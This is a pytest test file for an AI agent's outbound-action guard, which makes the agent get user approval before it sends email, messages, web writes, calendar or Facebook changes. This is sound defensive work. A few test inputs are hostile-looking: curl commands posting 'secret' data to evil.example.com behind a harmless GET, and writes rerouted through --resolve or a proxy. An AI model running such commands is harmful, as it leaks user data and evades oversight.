"""kiwiagent: outbound actions need the user's approval (SmartBuddy promise:
"Every action needs your approval").

Anything the buddy sends out in the user's name — email, messages to other
people, data written to an external service — is detected so it can always be
put in front of the user (never smart-auto-approved), and never runs from a
cron job where no one is there to approve it.
"""
import pytest

from tools.outbound_guard import (
    allowable_http_host,
    detect_outbound_action,
    detect_outbound_command,
    detect_outbound_script_file,
)


class TestEmail:
    @pytest.mark.parametrize("text", [
        "import smtplib\ns = smtplib.SMTP_SSL('smtp.gmail.com', 465)\ns.send_message(msg)",
        "server = SMTP('smtp.office365.com', 587)",
        "echo hi | sendmail boss@example.com",
        "mail -s 'Report' boss@example.com < report.txt",
        "msmtp -a work boss@example.com < mail.txt",
        "service.users().messages().send(userId='me', body=raw).execute()",
        "service.users().drafts().send(userId='me', body={'id': d}).execute()",
        "curl -X POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send -d @raw.json",
        # himalaya, the SmartBuddy mail skill's CLI (bug: sent with no approval card).
        'himalaya message compose -a me@x.co -t boss@example.com -s "Q3" --body-file b.txt --send --no-save',
        "himalaya message reply -a me@x.co 42 --body-file b.txt --send --no-save",
        "himalaya message forward -a me@x.co 42 -t ann@example.com",
        "himalaya message send -a me@x.co < raw.eml",
        "himalaya message write -a me@x.co",
        "himalaya template send -a me@x.co < tpl.eml",
        "/opt/data/.local/bin/himalaya --output json message reply 7 --send",
        "subprocess.run(['himalaya', 'message', 'send', '-a', acct], input=raw)",
    ])
    def test_detected(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:email"
        assert desc == "send an email"

    def test_reading_mail_is_not_outbound(self):
        text = "import imaplib\nM = imaplib.IMAP4_SSL('imap.gmail.com')\nM.select('INBOX')"
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        'himalaya envelope search -a me@x.co subject "invoice"',
        "himalaya envelope list -a me@x.co --page-size 20",
        "himalaya message read -a me@x.co 42",
        "himalaya attachment list -a me@x.co 42",
        "himalaya attachment download -a me@x.co 42 --dir ~/mail-attachments",
        "himalaya folder list -a me@x.co",
    ])
    def test_reading_mail_with_himalaya_is_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestMessages:
    @pytest.mark.parametrize("text", [
        "from twilio.rest import Client\nClient(sid, tok).messages.create(to=n, body=b)",
        "curl -s https://api.telegram.org/bot123:abc/sendMessage -d chat_id=1 -d text=hi",
        "curl -X POST -H 'Content-type: application/json' --data '{}' https://hooks.slack.com/services/T/B/X",
        "requests.post('https://discord.com/api/webhooks/1/abc', json={'content': 'hi'})",
    ])
    def test_detected(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:message"
        assert desc == "send a message to someone"


class TestHttpWrites:
    @pytest.mark.parametrize("text,host", [
        ("curl -X POST https://api.example.com/orders -d '{}'", "api.example.com"),
        ("curl --request DELETE https://api.example.com/items/1", "api.example.com"),
        ("curl -d name=x https://forms.example.org/submit", "forms.example.org"),
        ("curl -F file=@a.pdf https://upload.example.net/", "upload.example.net"),
        ("wget --post-data 'a=1' https://shop.example.com/cart", "shop.example.com"),
        ("http POST https://api.example.com/x name=y", "api.example.com"),
        ("import requests\nrequests.put('https://api.example.com/profile', json=p)", "api.example.com"),
        ("import httpx\nhttpx.patch('https://api.example.com/x', json=p)", "api.example.com"),
    ])
    def test_detected_with_host(self, text, host):
        found, key, desc = detect_outbound_action(text)
        assert found and key == f"outbound:http:{host}"
        assert desc == f"send data to {host}"

    def test_unknown_target_still_detected(self):
        found, key, desc = detect_outbound_action("import requests\nrequests.post(url, json=payload)")
        assert found and desc == "send data to an online service"

    @pytest.mark.parametrize("text", [
        "curl https://api.example.com/items",
        "curl -s -o page.html https://example.com",
        "wget https://example.com/file.zip",
        "requests.get('https://api.example.com/x')",
        "http GET https://api.example.com/x",
    ])
    def test_reads_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        'curl -G --data-urlencode "q=Fluffy Cake Auckland" -d format=json https://nominatim.openstreetmap.org/search',
        'curl -sG "https://www.mojeek.com/search" --data-urlencode "q=weather Auckland"',
        "curl -s -G -d lat=-36.85 -d lon=174.76 https://nominatim.openstreetmap.org/reverse",
        'curl --get --data-urlencode "query=ferry times" https://api.example.com/search',
        'curl -GsS --data-urlencode "q=bus" https://example.com/s && echo done',
    ])
    def test_curl_get_with_query_data_is_not_outbound(self, text):
        # -G / --get puts the data in the URL query: a lookup, not a write.
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        "curl -G -X POST -d a=1 https://api.example.com/x",
        "curl -G --request PUT -d a=1 https://api.example.com/x",
        "curl -G -T notes.txt https://upload.example.com/",
        "curl -G -F file=@a.pdf https://upload.example.com/",
        "curl -XGET -d a=1 https://api.example.com/x",
        "curl -G -d q=x https://example.com/s; curl -d secret=1 https://evil.example.com/",
        "curl -G -d q=x https://example.com/s && curl -d secret=1 https://evil.example.com/",
    ])
    def test_curl_get_does_not_hide_real_writes(self, text):
        assert detect_outbound_action(text)[0] is True

    def test_curl_get_next_to_write_names_the_write_host(self):
        text = "curl -G -d q=x https://search.example.com/s; curl -d a=1 https://api.example.org/x"
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:http:api.example.org"
        assert desc == "send data to api.example.org"

    @pytest.mark.parametrize("text", [
        "curl -X POST http://localhost:8642/v1/chat -d '{}'",
        "curl -X POST http://127.0.0.1:9000/x -d a=1",
        "requests.post('http://litellm.platform.svc.cluster.local:4000/v1/chat/completions', json=b)",
    ])
    def test_internal_hosts_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        "requests.post('https://api.notion.com/v1/databases/abc/query', json={})",
        "curl -X POST https://api.notion.com/v1/search -d '{}'",
    ])
    def test_read_only_post_apis_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestNotionReadOnly:
    """Notion's search / query APIs are POSTs that only read. Scripts usually
    build the URL from a base (f"{API_URL}/search"), so the full URL never
    appears as one string."""

    def test_search_with_built_url_not_outbound(self):
        text = (
            'API_URL = "https://api.notion.com/v1"\n'
            'req = urllib.request.Request(\n    f"{API_URL}/search",\n'
            '    data=json.dumps(body).encode(), headers=h,\n    method=\'POST\'\n)\n'
            'with urllib.request.urlopen(req) as r:\n    pages = json.load(r)["results"]\n'
        )
        assert detect_outbound_action(text)[0] is False

    def test_database_query_with_built_url_not_outbound(self):
        text = (
            'BASE = "https://api.notion.com/v1"\n'
            'requests.post(f"{BASE}/databases/{db_id}/query", headers=h, json={})\n'
        )
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/pages", json=page)',
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/search", json={})\n'
        'requests.patch(f"{BASE}/pages/{pid}", json={"archived": True})',
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/comments", json=c)',
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/search")\n'
        'requests.patch(f"{BASE}/blocks/{bid}/children", json=b)',
    ])
    def test_notion_writes_still_outbound(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and desc == "send data to api.notion.com"


class TestCommandWithScriptFile:
    def test_script_file_contents_are_scanned(self, tmp_path):
        (tmp_path / "send_report.py").write_text(
            "import smtplib\nwith smtplib.SMTP_SSL('smtp.gmail.com') as s:\n    s.send_message(m)\n")

        found, key, _ = detect_outbound_command("python3 send_report.py --to boss", cwd=str(tmp_path))

        assert found and key == "outbound:email"

    def test_script_found_in_scripts_dir(self, tmp_path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "notify.sh").write_text("curl -X POST https://hooks.slack.com/services/a -d x\n")

        found, key, _ = detect_outbound_command("bash scripts/notify.sh", cwd=str(tmp_path))

        assert found and key == "outbound:message"

    def test_harmless_script_not_flagged(self, tmp_path):
        (tmp_path / "check_mail.py").write_text("import imaplib\nprint('ok')\n")

        assert detect_outbound_command("python check_mail.py", cwd=str(tmp_path))[0] is False

    def test_missing_script_is_not_an_error(self, tmp_path):
        assert detect_outbound_command("python nope.py", cwd=str(tmp_path))[0] is False

    @pytest.mark.parametrize("template", [
        'python3 "{script}"',
        "python3 '{script}'",
        'python3 "{script}" --to boss',
    ])
    def test_quoted_script_path_is_still_scanned(self, tmp_path, template):
        # A quoted path used to skip the file scan entirely, so a buddy
        # script's send went unflagged.
        script = tmp_path / "send_report.py"
        script.write_text("import smtplib\nsmtplib.SMTP('smtp.gmail.com')\n")

        found, key, _ = detect_outbound_command(template.format(script=script))

        assert found and key == "outbound:email"

    def test_quoted_script_path_with_a_space_is_still_scanned(self, tmp_path):
        script = tmp_path / "send report.py"
        script.write_text("import smtplib\nsmtplib.SMTP('smtp.gmail.com')\n")

        found, key, _ = detect_outbound_command(f'python3 "{script}"')

        assert found and key == "outbound:email"

    @pytest.mark.parametrize("template", [
        'bash -c "python3 send.py"',
        "sh -c 'cd . && python3 send.py'",
        'env bash -c "python3 send.py"',
        'bash -c "timeout 30 python3 send.py"',
        'bash -c "exec send.py"',
        'sh -c "nice send.py"',
        'bash -c "FOO=1 python3 send.py"',
        'bash -c "/usr/bin/python3 send.py"',
        'sh -c "PYTHONPATH=. python3 send.py"',
        'sh -c "stdbuf -oL python3 send.py"',
    ])
    def test_a_quoted_command_is_not_a_path_but_its_script_is_scanned(self, tmp_path, template):
        # Quoting the *command* used to capture the whole string as a path, so
        # the script inside it was never scanned: wrappers and absolute
        # interpreters must not swallow it.
        (tmp_path / "send.py").write_text("import smtplib\nsmtplib.SMTP('smtp.gmail.com')\n")

        found, key, _ = detect_outbound_command(template, cwd=str(tmp_path))

        assert found and key == "outbound:email"

    @pytest.mark.parametrize("template", ['python3 "{path}"', "python3 '{path}'"])
    def test_a_quoted_path_starting_with_a_command_word_is_still_scanned(self, tmp_path, template):
        # `env/` is a plausible virtualenv directory; a path is a path however
        # its first segment is spelled.
        (tmp_path / "env").mkdir()
        (tmp_path / "env" / "send.py").write_text("import smtplib\nsmtplib.SMTP('x')\n")

        found, key, _ = detect_outbound_command(
            template.format(path=tmp_path / "env" / "send.py"))

        assert found and key == "outbound:email"

    def test_plain_command_is_scanned(self, tmp_path):
        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.example.com/x -d a=1", cwd=str(tmp_path))
        assert found and key == "outbound:http:api.example.com"


class TestPerHostKey:
    """A write to exactly one external host is keyed by that host, so the user
    can always-allow it (outbound:http:<host>). Anything else stays generic."""

    def test_host_is_lowercased_and_port_dropped(self):
        found, key, _ = detect_outbound_action("curl -X POST https://API.Notion.com:443/v1/pages -d '{}'")
        assert found and key == "outbound:http:api.notion.com"

    def test_userinfo_is_not_the_host(self):
        found, key, _ = detect_outbound_action("curl -X POST https://bot:s3cret@api.example.com/x -d a=1")
        assert found and key == "outbound:http:api.example.com"

    def test_same_host_twice_is_one_host(self):
        text = ("requests.post('https://api.example.com/a', json=1)\n"
                "requests.post('https://api.example.com/b', json=2)")
        assert detect_outbound_action(text)[1] == "outbound:http:api.example.com"

    def test_several_external_hosts_get_generic_key(self):
        text = "curl https://a.example.com/x | curl -X POST https://b.example.org/y -d @-"
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"

    def test_unknown_target_gets_generic_key(self):
        found, key, _ = detect_outbound_action("import requests\nrequests.post(url, json=payload)")
        assert found and key == "outbound:http"

    def test_templated_host_gets_generic_key(self):
        found, key, _ = detect_outbound_action('requests.post(f"https://{host}/v1/x", json=b)')
        assert found and key == "outbound:http"


class TestPublishAsUserHosts:
    """Writes to social-posting and mail/message-sending APIs publish in the
    user's name: they are never a plain http write (never always-allowed)."""

    @pytest.mark.parametrize("host", [
        "api.twitter.com", "api.x.com", "graph.facebook.com", "graph.instagram.com",
        "api.linkedin.com", "api.weibo.com", "open.weibo.com", "graph.threads.net",
        "api.threads.net", "gmail.googleapis.com", "graph.microsoft.com",
        "api.sendgrid.com", "api.mailgun.net", "api.postmarkapp.com", "slack.com",
        "api.slack.com", "discord.com", "api.telegram.org", "graph.whatsapp.com",
        "mmg.whatsapp.net",
    ])
    def test_write_is_publish(self, host):
        found, key, desc = detect_outbound_action(f"curl -X POST https://{host}/v1/x -d a=1")
        assert found and key == "outbound:publish"
        assert desc == f"send data to {host}"

    def test_twilio_is_a_message(self):
        found, key, _ = detect_outbound_action("curl -X POST https://api.twilio.com/v1/x -d a=1")
        assert found and key == "outbound:message"

    def test_publish_host_among_others_is_publish(self):
        text = ("requests.post('https://api.notion.com/v1/pages', json=p)\n"
                "requests.post('https://api.x.com/2/tweets', json=t)")
        assert detect_outbound_action(text)[1] == "outbound:publish"

    def test_lookalike_host_is_not_publish(self):
        found, key, _ = detect_outbound_action("curl -X POST https://notslack.com/x -d a=1")
        assert found and key == "outbound:http:notslack.com"

    def test_reading_from_publish_host_is_not_outbound(self):
        assert detect_outbound_action("curl https://api.x.com/2/tweets/1")[0] is False


class TestAllowableHttpHost:
    @pytest.mark.parametrize("key,host", [
        ("outbound:http:api.notion.com", "api.notion.com"),
        ("outbound:http:hooks.zapier.com", "hooks.zapier.com"),
    ])
    def test_allowable(self, key, host):
        assert allowable_http_host(key) == host

    @pytest.mark.parametrize("key", [
        "outbound:email", "outbound:message", "outbound:publish",
        "outbound:email:x", "outbound:http", "outbound:http:",
        "outbound:http:api.x.com", "outbound:http:graph.whatsapp.com",
        "outbound:http:API.NOTION.COM", "outbound:http:{host}",
        "recursive delete", "", None,
    ])
    def test_not_allowable(self, key):
        assert allowable_http_host(key) is None


class TestPerHostKeyNeedsLiteralTargets:
    """outbound:http:<host> (always-allowable) only when EVERY write has a
    literal target URL on that one host. A URL in a comment or an unrelated
    string never makes a write to a variable target "literal to that host"."""

    @pytest.mark.parametrize("text", [
        # comment mentions notion, write goes to a variable
        "# push to https://api.notion.com/v1/pages\nrequests.post(url, json=p)",
        # unrelated string mentions notion
        'DOCS = "https://api.notion.com/v1/pages"\nrequests.post(os.environ["HOOK"], json=p)',
        # literal notion write plus a write to a variable
        "requests.post('https://api.notion.com/v1/pages', json=p)\nrequests.post(target, json=p)",
        # a client object posting to a variable is still a write
        "requests.post('https://api.notion.com/v1/pages', json=p)\nclient.post(target, json=p)",
        # string concatenation / formatting is not literal
        "requests.post('https://api.notion.com/' + path, json=p)",
        "requests.post('https://%s/v1/pages' % host, json=p)",
        # f-string whose host part is not literal
        'requests.post(f"https://api.notion.com{suffix}", json=p)',
        'requests.post(f"https://{host}/v1/pages", json=p)',
        # url passed late as keyword after other args
        "requests.post(json=p, url=u)\n# https://api.notion.com",
        # urllib with method= and a variable url
        "req = urllib.request.Request(url, data=b, method='POST')\n# https://api.notion.com/v1",
        # curl to a shell variable, notion only in a header
        'curl -X POST "$URL" -H "Referer: https://api.notion.com" -d @p.json',
        # curl schemeless target, notion only in a header
        "curl -X POST evil.example.com -H 'Referer: https://api.notion.com' -d @p.json",
        # curl connection redirected / proxied
        "curl -X POST https://api.notion.com/v1/pages --resolve api.notion.com:443:203.0.113.9 -d @p",
        "curl -x http://203.0.113.9:8080 -X POST https://api.notion.com/v1/pages -d @p",
        # a later curl segment writing to a variable
        "curl -X POST https://api.notion.com/v1/pages -d @p && curl -X POST $HOOK -d @p",
        # curl run from Python with an argument list (not parsed as a shell call)
        "requests.post('https://api.notion.com/v1/pages', json=p)\n"
        "subprocess.run(['curl', '-X', 'POST', hook, '-d', body])",
    ])
    def test_non_literal_write_gets_generic_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"

    @pytest.mark.parametrize("text", [
        "requests.post('https://api.notion.com/v1/pages', json=a)\n"
        "requests.patch(\"https://api.notion.com/v1/pages/1\", json=b)",
        'requests.post(f"https://api.notion.com/v1/pages/{pid}", json=b)',
        "requests.post(url='https://api.notion.com/v1/pages', json=b)",
        "httpx.post(\n    'https://api.notion.com/v1/pages',\n    json=b,\n)",
        "req = urllib.request.Request('https://api.notion.com/v1/pages', data=b, method='POST')",
        "curl -sS -X POST https://api.notion.com/v1/pages -H \"Authorization: Bearer $NOTION_TOKEN\" -d @p.json",
        "curl -XPOST 'https://api.notion.com/v1/pages' --data-binary @p.json",
        "http POST https://api.notion.com/v1/pages Authorization:\"Bearer $T\" title=x",
        "wget --header 'Content-Type: application/json' --post-file p.json https://api.notion.com/v1/pages",
    ])
    def test_literal_writes_to_one_host_get_host_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http:api.notion.com"


class TestCommandAndScriptsCombined:
    def test_script_writing_to_variable_spoils_command_host(self, tmp_path):
        (tmp_path / "sync.py").write_text("import requests\nrequests.post(HOOK, json=d)\n")

        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 sync.py", cwd=str(tmp_path))

        assert found and key == "outbound:http"

    def test_email_in_script_outranks_http_in_command(self, tmp_path):
        (tmp_path / "mail.py").write_text("import smtplib\nsmtplib.SMTP('x')\n")

        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 mail.py", cwd=str(tmp_path))

        assert found and key == "outbound:email"

    def test_command_and_script_on_same_host_keep_host_key(self, tmp_path):
        (tmp_path / "sync.py").write_text(
            "import requests\nrequests.post('https://api.notion.com/v1/pages', json=d)\n")

        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 sync.py", cwd=str(tmp_path))

        assert key == "outbound:http:api.notion.com"


class TestInternalExemptionNeedsLiteralTargets:
    """Only talking to the platform itself is fine — but only when every write
    literally targets an internal host. An internal URL in a comment or string
    never vouches for a write to a variable."""

    @pytest.mark.parametrize("text", [
        "# local test: http://localhost:8642/v1\nrequests.post(url, json=b)",
        'BASE = "http://127.0.0.1:9000"\nrequests.post(os.environ["HOOK"], json=b)',
        'curl -X POST "$URL" -d x  # http://localhost:8642/v1',
        "requests.post('http://localhost:8642/v1/x', json=b)\nrequests.post(hook, json=b)",
        "fetch(target, {method: 'POST', body})\n// http://localhost:3000",
    ])
    def test_variable_write_is_outbound(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"

    @pytest.mark.parametrize("text", [
        "fetch('http://localhost:3000/api/x', {method: 'POST', body})",
        "requests.post('http://localhost:8642/v1/a', json=b)\nrequests.put('http://127.0.0.1:9000/b', json=c)",
    ])
    def test_literal_internal_writes_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestNotionReadOnlyNeedsLiteralTargets:
    """The Notion read-only exemption covers a script only when every
    write-looking call targets a Notion read endpoint (search / database
    query) — literally, or through a base URL constant assigned once."""

    @pytest.mark.parametrize("text", [
        # read endpoint only in a comment, POST to a variable
        "# https://api.notion.com/v1/search\nrequests.post(url, json={})",
        # literal Notion search plus a POST to a variable
        "requests.post('https://api.notion.com/v1/search', json={})\nrequests.post(hook, json=data)",
        # built search URL plus a POST to a variable
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/search", json={})\n'
        "requests.post(other, json=x)",
        # base constant reassigned
        'BASE = "https://api.notion.com/v1"\nBASE = os.environ["X"]\n'
        'requests.post(f"{BASE}/search", json={})',
        # base shadowed by a parameter
        'BASE = "https://api.notion.com/v1"\ndef q(BASE):\n'
        '    requests.post(f"{BASE}/search", json={})',
        # read endpoint, write method
        "curl -X PATCH https://api.notion.com/v1/search -d '{}'",
        "requests.put('https://api.notion.com/v1/search', json={})",
        # Notion search via fetch plus fetch POST to a variable
        "fetch('https://api.notion.com/v1/search', {method: 'POST'})\n"
        "fetch(hook, {method: 'POST', body})",
    ])
    def test_not_exempt(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key.startswith("outbound:http")

    @pytest.mark.parametrize("text", [
        "fetch('https://api.notion.com/v1/search', {method: 'POST', body: q})",
        "curl -sS -X POST https://api.notion.com/v1/databases/abc/query -H \"Authorization: Bearer $T\" -d '{}'",
    ])
    def test_read_only_calls_still_exempt(self, text):
        assert detect_outbound_action(text)[0] is False


class TestJavaScriptWrites:
    @pytest.mark.parametrize("text,key", [
        ("await fetch('https://api.example.com/x', {method: 'POST', body: b})",
         "outbound:http:api.example.com"),
        ("fetch(`https://api.example.com/items/${id}`, { method: \"PATCH\", body })",
         "outbound:http:api.example.com"),
        ("const r = await fetch(url, { method: 'PUT', body })", "outbound:http"),
        ("fetch(`https://${host}/x`, {method: 'DELETE'})", "outbound:http"),
        ("await axios.post('https://api.example.com/x', data)", "outbound:http:api.example.com"),
        ("await axios.delete(url)", "outbound:http"),
        ("axios({method: 'post', url: 'https://api.example.com/x', data})", "outbound:http"),
        ("const req = https.request({hostname: 'api.example.com', method: 'POST'}, cb)",
         "outbound:http"),
    ])
    def test_detected(self, text, key):
        found, got, _ = detect_outbound_action(text)
        assert found and got == key

    @pytest.mark.parametrize("text", [
        "const r = await fetch('https://api.example.com/x')",
        "fetch('https://api.example.com/x', {method: 'GET'})",
        "await axios.get('https://api.example.com/x')",
    ])
    def test_reads_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("command,name", [
        ("node send.mjs", "send.mjs"),
        ("npx tsx send.ts", "send.ts"),
        ("bun run send.ts", "send.ts"),
        ("deno run -A send.ts", "send.ts"),
        ("node scripts/post.cjs --dry-run=false", "scripts/post.cjs"),
    ])
    def test_js_script_files_are_scanned(self, tmp_path, command, name):
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("await fetch(process.env.HOOK, {method: 'POST', body})\n")

        found, key, _ = detect_outbound_command(command, cwd=str(tmp_path))

        assert found and key == "outbound:http"


class TestHostKeyThroughBaseConstant:
    """The Notion skill writes with f"{API_URL}/pages": a base constant bound
    once to a literal URL counts as a literal target for the host key too."""

    @pytest.mark.parametrize("text", [
        'API_URL = "https://api.notion.com/v1"\nrequests.post(f"{API_URL}/pages", json=page)',
        'BASE: str = "https://api.notion.com/v1"\nrequests.patch(f"{BASE}/pages/{pid}", json=p)\n'
        'requests.post(f"{BASE}/pages", json=q)',
        'const BASE = "https://api.notion.com/v1";\n'
        "await fetch(`${BASE}/pages`, {method: 'POST', body})",
    ])
    def test_base_constant_gets_host_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http:api.notion.com"

    @pytest.mark.parametrize("text", [
        # reassigned
        'BASE = "https://api.notion.com/v1"\nBASE = os.environ["X"]\n'
        'requests.post(f"{BASE}/pages", json=p)',
        'BASE = "https://api.notion.com/v1"\nBASE += suffix\nrequests.post(f"{BASE}/pages", json=p)',
        # shadowed by a parameter
        'BASE = "https://api.notion.com/v1"\ndef create(BASE, page):\n'
        '    requests.post(f"{BASE}/pages", json=page)',
        # deleted
        'BASE = "https://api.notion.com/v1"\ndel BASE\nrequests.post(f"{BASE}/pages", json=p)',
        # built from another expression
        'BASE = HOST + "/v1"\nrequests.post(f"{BASE}/pages", json=p)\n# https://api.notion.com',
        # base on another host, notion only in a comment
        'BASE = "https://hooks.example.org/v1"\n# like https://api.notion.com/v1/pages\n'
        'requests.post(f"{BASE}/pages", json=p)',
    ])
    def test_unsure_base_gets_generic_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"


SB = "/opt/hermes/plugins/platforms/smartbuddy/sb.py"


class TestSmartBuddyCalendarWrites:
    """kiwiagent 2026-10-27: `sb gcal add/change/delete` write the user's
    Google Calendar through the platform (an internal address, so the HTTP
    rules let it through) — with no approval card. They now need one, and it
    can never be always-allowed."""

    @pytest.mark.parametrize("text", [
        f'python3 {SB} gcal add --title "Dentist" --start 2026-10-30T09:00:00+13:00',
        f"python3 {SB} gcal change abc123 --start 2026-10-31T10:00:00+13:00",
        f"python3 {SB} gcal delete abc123",
        "sb gcal add --title 'Swim' --date 2026-11-02",
        "sb gcal delete abc123",
        f"subprocess.run(['python3', '{SB}', 'gcal', 'delete', eid])",
        "subprocess.run([\"python3\", SB, \"gcal\", \"add\", \"--title\", t])",
    ])
    def test_detected(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:calendar"
        assert desc == "change your calendar"
        assert allowable_http_host(key) is None  # never "Always allow"

    @pytest.mark.parametrize("text", [
        f"python3 {SB} calendar --from 2026-10-30T00:00:00Z --to 2026-10-31T00:00:00Z",
        "sb calendar",
        f"python3 {SB} whoami",
        f'python3 {SB} mail search "from:bank"',
        "grep -n 'gcal add' notes.txt",
    ])
    def test_reading_is_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestSmartBuddyFacebookWrites:
    """Posting on (or deleting from) the user's Facebook Page publishes as
    them: an approval card, like any publish. Boosts are created paused (the
    user starts them in the app), so preparing one doesn't ask."""

    @pytest.mark.parametrize("text", [
        f'python3 {SB} facebook post --text "Open day Saturday!"',
        "sb facebook post --link https://example.com --text hi",
        f"python3 {SB} facebook delete 123_456",
    ])
    def test_detected(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:publish"
        assert desc == "post on Facebook"

    @pytest.mark.parametrize("text", [
        f"python3 {SB} facebook status",
        f"python3 {SB} facebook posts",
        f"python3 {SB} facebook boost 123_456 --budget 20 --days 3",
        f"python3 {SB} facebook pause 999",
    ])
    def test_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestPlatformCliSource:
    """The command scan also reads the scripts a command runs. sb.py's own
    help text names `sb gcal add` etc., so reading it must not turn every sb
    call into a calendar change; a script of the buddy's own that calls them
    still counts."""

    def test_sb_read_command_not_flagged_by_its_help_text(self, tmp_path, monkeypatch):
        import tools.outbound_guard as guard
        cli = tmp_path / "sb.py"
        cli.write_text('"""\n    sb gcal add --title T\n    sb gcal delete <eventId>\n    sb facebook post\n"""\n')
        monkeypatch.setattr(guard, "_PLATFORM_CLI", str(cli))
        assert detect_outbound_command(f"python3 {cli} mail search x")[0] is False
        assert detect_outbound_command(f"python3 {cli} gcal add --title x --date 2026-11-02")[1] == "outbound:calendar"

    def test_own_script_calling_gcal_delete_is_flagged(self, tmp_path):
        script = tmp_path / "tidy.py"
        script.write_text(f"import subprocess\nsubprocess.run(['python3', '{SB}', 'gcal', 'delete', 'e1'])\n")
        found, key, _ = detect_outbound_command(f"python3 {script}")
        assert found and key == "outbound:calendar"


# The installed CLI's own source (bug 2026-10-28): every SmartBuddy turn runs
# `python3 .../sb.py …`, and the command scan reads the file it runs. An
# argparse help string mentioning the mail client ("himalaya config for every
# connected mailbox") was read as a hidden way to send email, so *every*
# question raised an "Allow your buddy to do this? send an email" card — and
# email is never always-allowable, so the user could not stop it.
OLD_SB_SOURCE = '''"""SmartBuddy's platform CLI.

    sb mail setup                 (himalaya config for every connected mailbox)
    sb gcal add --title T --date D
    sb facebook post --message hi
"""
import argparse

parser = argparse.ArgumentParser()
sub = parser.add_subparsers()
mail = sub.add_parser("mail")
mail.add_parser(
    "setup",
    help="himalaya config for every connected mailbox (run before using himalaya)",
)
'''


class TestInstalledCliOwnSourceNeverAsks:
    def _install(self, tmp_path, monkeypatch, source=OLD_SB_SOURCE):
        import tools.outbound_guard as guard
        plugins = tmp_path / "platforms" / "smartbuddy"
        plugins.mkdir(parents=True, exist_ok=True)
        cli = plugins / "sb.py"
        cli.write_text(source)
        monkeypatch.setattr(guard, "_PLATFORM_CLI", str(cli))
        return cli

    @pytest.mark.parametrize("args", [
        "calendar",
        "mail accounts",
        "mail search from:school",
        "mail password",
        "mail unsubscribe news@x.co",
        "trails near",
        "whoami",
    ])
    def test_running_the_installed_cli_never_asks(self, tmp_path, monkeypatch, args):
        # Reads only: a write on this command line (gcal add, facebook post)
        # is still an action — see TestSmartBuddyCalendarWrites /
        # TestSmartBuddyFacebookWrites.
        cli = self._install(tmp_path, monkeypatch)
        assert detect_outbound_command(f"python3 {cli} {args}")[0] is False

    @pytest.mark.platforms("posix")
    def test_symlinked_cli_never_asks(self, tmp_path, monkeypatch):
        cli = self._install(tmp_path, monkeypatch)
        link = tmp_path / "bin" / "sb.py"
        link.parent.mkdir()
        link.symlink_to(cli)
        assert detect_outbound_command(f"python3 {link} calendar")[0] is False

    def test_relative_path_to_the_cli_never_asks(self, tmp_path, monkeypatch):
        cli = self._install(tmp_path, monkeypatch)
        assert detect_outbound_command("python3 sb.py calendar", cwd=str(cli.parent))[0] is False

    def test_sibling_module_really_sending_still_asks(self, tmp_path, monkeypatch):
        # Only the CLI file is exempt: a file beside it is the buddy's own
        # code and judged like any other script.
        cli = self._install(tmp_path, monkeypatch)
        helper = cli.parent / "area.py"
        helper.write_text(
            'import subprocess\n'
            'subprocess.run(["himalaya", "message", "send", "-a", "me@x.co"])\n'
        )
        found, key, _ = detect_outbound_command(f"python3 {helper}")
        assert found and key == "outbound:email"

    def test_copy_of_the_cli_source_elsewhere_still_asks(self, tmp_path, monkeypatch):
        # The exemption is file identity: the same text at another path is the
        # buddy's own code, judged on what it really does (not on its help
        # text, which the exemption is there to ignore).
        self._install(tmp_path, monkeypatch)
        copy = tmp_path / "copied_cli.py"
        copy.write_text(OLD_SB_SOURCE + "import smtplib\nsmtplib.SMTP('smtp.gmail.com')\n")
        found, key, _ = detect_outbound_command(f"python3 {copy}")
        assert found and key == "outbound:email"

    @pytest.mark.parametrize(("args", "key"), [
        ("gcal add --title x --date 2026-11-02", "outbound:calendar"),
        ("gcal delete e1", "outbound:calendar"),
        ("facebook post --message hi", "outbound:publish"),
    ])
    def test_a_cli_write_on_the_command_line_still_asks(self, tmp_path, monkeypatch, args, key):
        # The exemption covers reading the CLI's own source, never an action
        # the command line asks for.
        cli = self._install(tmp_path, monkeypatch)
        assert detect_outbound_command(f"python3 {cli} {args}")[:2] == (True, key)
